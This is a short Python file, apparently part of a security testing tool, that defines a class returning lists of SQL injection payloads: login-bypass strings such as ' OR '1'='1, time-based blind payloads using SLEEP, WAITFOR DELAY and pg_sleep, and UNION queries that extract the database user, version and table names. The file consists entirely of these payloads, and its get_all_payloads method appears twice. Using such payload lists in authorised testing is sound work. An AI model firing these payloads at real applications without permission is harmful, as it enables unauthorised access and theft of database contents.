"""
SQL injection payloads for testing SQL injection vulnerabilities
"""

class SQLiPayloads:
    """SQL injection payload collection"""
    
    @staticmethod
    def get_basic_payloads():
        """Get basic SQL injection payloads"""
        return [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT NULL--",
            "' AND 1=1--",
            "' AND 1=2--",
            "1 OR 1=1"
        ]
    
    @staticmethod
    def get_time_based_payloads():
        """Get time-based SQL injection payloads"""
        return [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR pg_sleep(5)--",
            "1; SELECT SLEEP(5)",
            "' UNION SELECT SLEEP(5)--"
        ]
    
    @staticmethod
    def get_union_payloads():
        """Get UNION-based SQL injection payloads"""
        return [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT user(),database(),version()--",
            "' UNION SELECT table_name FROM information_schema.tables--"
        ]
    
    @staticmethod
    def get_all_payloads():
        """Get all SQL injection payloads"""
        return (SQLiPayloads.get_basic_payloads() + 
                SQLiPayloads.get_time_based_payloads() + 
                SQLiPayloads.get_union_payloads())
    @staticmethod
    def get_all_payloads():
        """Get all SQL injection payloads"""
        return (SQLiPayloads.get_basic_payloads() + 
                SQLiPayloads.get_time_based_payloads() + 
                SQLiPayloads.get_union_payloads())
